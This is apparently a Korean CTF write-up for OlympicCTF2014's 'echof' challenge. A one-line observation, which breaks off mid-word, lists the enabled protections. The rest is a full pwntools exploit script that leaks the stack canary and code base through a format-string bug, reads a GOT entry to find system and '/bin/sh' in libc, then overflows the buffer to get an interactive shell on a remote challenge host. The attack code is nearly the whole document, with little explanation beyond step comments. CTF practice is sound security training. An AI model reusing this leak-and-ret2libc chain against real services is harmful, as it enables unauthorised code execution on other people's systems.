---
layout: post
title: Writeup - echof (from OlympicCTF2014)
---
# echof
## 관찰
NX, ASLR, PIE, stack canary, full RELRO가 모두 결

## 풀이
```python
from pwn import * 

#p = process("./echof")
p = remote("remote.goatskin.kr", 49281)
context.log_level = "debug"

# Step 1: leak code offset &
payload1 = "%80$x|%78$x|"
payload1 += (128 - len(payload1))*"A"

p.send("letmein\n")
p.send(payload1)
p.recvuntil("msg?\n")
p_ret_raw = p.recvuntil("|")[:-1]
canary_raw = p.recvuntil("|")[:-1]
p_ret = int(p_ret_raw, 16)
canary = int(canary_raw, 16)
base_code = p_ret - 0x840

log.info("canary: " + hex(canary))

# Step 2: read got w/ FSB
offset_got_lsm = 0x1FD8
payload2 = p32(base_code + offset_got_lsm) + "%14$s|"
payload2 += (128 - len(payload2))*"A"
p.send(payload2)
p.recvuntil("msg?\n")
p_lsm_raw = p.recvuntil("|")[4:8]
p_lsm = u32(p_lsm_raw)

p_system = p_lsm + 0x22c70
p_sh = p_lsm + 0x147133
log.info("p_lsm: " + hex(p_lsm))

# Step 3: bof

payload3 = "%256c" + "%78$c" + p32(canary)[1:]
payload3 += p32(p_system)*5 + p32(p_sh)
payload3 += (128 - len(payload3))*"A"
p.send(payload3)

context.log_level = "info"
p.interactive()
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTI4OTQxMjcyNSwtMjEyODAzMjIzMl19
-->